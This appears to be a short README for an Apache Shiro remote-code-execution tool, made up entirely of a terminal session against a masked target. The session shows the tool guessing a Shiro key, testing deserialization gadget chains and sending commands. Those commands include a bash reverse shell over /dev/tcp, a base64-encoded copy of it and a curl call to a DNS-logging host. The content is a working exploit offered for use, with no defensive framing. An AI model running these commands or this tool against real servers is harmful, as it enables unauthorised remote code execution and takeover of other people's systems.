# shiro_rce

```
[admin@ shiro]java -cp shiro_tool.jar Shiro https://xx.xx.xx.xx/          
[-] target: https://xx.xx.xx.xx/
[-] target is use shiro
[-] start guess shiro key.
[-] shiro key: kPH+bIxk5D2deZiIxcaaaA==
[-] check URLDNS
[*] find: URLDNS can be use
[-] check CommonsBeanutils1
[*] find: CommonsBeanutils1 can be use
[-] check CommonsCollections1
[-] check CommonsCollections2
[-] check CommonsCollections3
[-] check CommonsCollections4
[-] check CommonsCollections5
[-] check CommonsCollections6
[-] check CommonsCollections7
[-] check CommonsCollections8
[-] check CommonsCollections9
[-] check CommonsCollections10
[-] check Groovy1
[-] check JSON1
[*] find: JSON1 can be use
[-] check Spring1
[-] check Spring2
[-] check JRMPClient
[*] find: JRMPClient can be use
[*] JRMPClient please use: java -cp shiro_tool.jar ysoserial.exploit.JRMPListener 
0: URLDNS
1: CommonsBeanutils1
2: JSON1
3: JRMPClient
[-] please enter the number(0-3)
2
[-] use gadget: JSON1
[*] command example: bash -i >& /dev/tcp/xx.xx.xx.xx/80 0>&1
[*] command example: curl dnslog.xx.com
[*] if need base64 command, input should startwith bash=/powershell=/python=/perl= 
[-] please enter command, input q or quit to quit
> curl json.msvlch.wyzxxz.cn
[-] start process command: curl json.msvlch.wyzxxz.cn
[-] please enter command, input q or quit to quit
> bash=bash -i >& /dev/tcp/xx.xx.xx.xx/80 0>&1
[-] start process command: bash -c {echo,YmFzaD1iYXNoIC1pID4mIC9kZXYvdGNwL3h4Lnh4Lnh4Lnh4LzgwIDA+JjE=}|{base64,-d}|{bash,-i}
[-] please enter command, input q or quit to quit
> quit
[-] start process command: quit
[-] exit

```
